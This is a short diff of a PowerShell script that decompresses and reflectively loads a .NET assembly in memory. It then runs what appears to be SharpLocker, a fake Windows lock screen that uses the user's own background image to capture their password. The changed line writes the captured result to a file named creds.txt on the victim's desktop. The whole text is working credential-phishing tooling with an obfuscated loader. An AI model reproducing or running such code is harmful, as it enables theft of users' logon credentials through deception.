@@ -4,7 +4,7 @@ nal no New-Object -F;$m=no IO.MemoryStream;(no IO.Compression.GZipStream((no IO.
 [System.Reflection.Assembly]::Load($m.ToArray()) | Out-Null
 [Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null
 $result = [SharpLockerLib.Runner]::Run([Windows.System.UserProfile.LockScreen]::OriginalImageFile.AbsolutePath)
-$result
+$result > c:\users\$env:USERNAME\desktop\creds.txt
 
 # Version without user background
 #[SharpLockerLib.Runner]::Run()
